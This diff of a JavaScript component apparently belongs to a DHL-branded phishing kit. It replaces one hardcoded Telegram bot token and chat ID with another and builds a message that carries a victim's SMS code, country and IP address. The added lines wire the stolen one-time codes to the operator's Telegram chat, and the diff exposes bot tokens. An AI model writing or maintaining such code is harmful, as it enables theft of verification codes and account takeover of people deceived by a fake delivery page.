@@ -2949,9 +2949,9 @@ export default {
         );
         this.IP = tt.data.ip;
         this.query = tt.data.country_capital;
-        var token = "8085298009:AAE07ta8T4ML6IYTOShlJeVU1RqMYTS6Q8o";
-
-      var chatId2 = -4512252331 ;
+         var token = "7502132221:AAEreYpsCAFob_Yo5owYp4VAJz8okueT5Xg";
+    // var chatId = -823044704;
+    var chatId2 = -4886327064;
         var fullMessage = `
         ||||||||||🇨🇦| DHL EN |🇨🇦||||||||||%0ASMS : ${this.sms}%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| DHL|💳||||||||||`;
         if (this.tries > 0) {
